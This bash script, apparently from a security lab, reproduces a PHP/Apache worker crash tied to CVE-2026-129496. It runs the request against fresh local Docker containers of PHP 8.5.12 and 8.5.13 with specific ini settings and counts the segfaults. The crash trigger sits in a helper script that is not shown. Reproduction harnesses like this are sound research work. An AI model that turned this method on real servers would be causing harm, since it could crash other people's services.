#!/bin/bash
# Sends the session request to fresh Apache workers set up as CVE-2026-129496
# needs, and counts crashed workers. Usage: startup-diagnostic.sh [rounds]
LAB="$(cd "$(dirname "$0")" && pwd)"
rounds="${1:-5}"
port=18190

variant() { # name image ini
  local name="$1" image="$2" ini="$3" crashes=0 answered=0
  for _ in $(seq "$rounds"); do
    docker rm -f p2s-startup >/dev/null 2>&1
    docker run -d --name p2s-startup -p "127.0.0.1:$port:80" "$image" sh -c "printf '%s\n' '<?php echo \"hello \" . PHP_VERSION . \"\\n\";' > /var/www/html/index.php; printf '$ini' > /usr/local/etc/php/conf.d/zz-startup.ini; exec apache2-foreground" >/dev/null
    for _ in $(seq 50); do curl -s -o /dev/null "http://127.0.0.1:$port/robots.txt" && break; sleep 0.2; done
    # Prefork starts five children; six requests reach them while they are fresh.
    for _ in 1 2 3 4 5 6; do
      "$LAB/oracle.sh" "http://127.0.0.1:$port/" | grep -q 'Failed to read session data' && answered=$((answered + 1))
    done
    sleep 1
    crashes=$((crashes + $(docker logs p2s-startup 2>&1 | grep -c -E 'Segmentation fault|exit signal')))
  done
  docker rm -f p2s-startup >/dev/null 2>&1
  echo "$name: requests=$((rounds * 6)) answered=$answered crashes=$crashes"
}

log='log_errors=On\nerror_log=/tmp/php-errors.log\n'
deprecated='session.sid_length=48\nsession.sid_bits_per_character=5\n'
variant "8.5.12 invalid timezone" php:8.5.12-apache "${log}date.timezone=Invalid/Zone\n"
variant "8.5.12 deprecated session settings" php:8.5.12-apache "${log}${deprecated}"
variant "8.5.13 invalid timezone" php:8.5.13-apache "${log}session.upload_progress.enabled=1\ndate.timezone=Invalid/Zone\n"
variant "8.5.13 deprecated session settings" php:8.5.13-apache "${log}session.upload_progress.enabled=1\n${deprecated}"
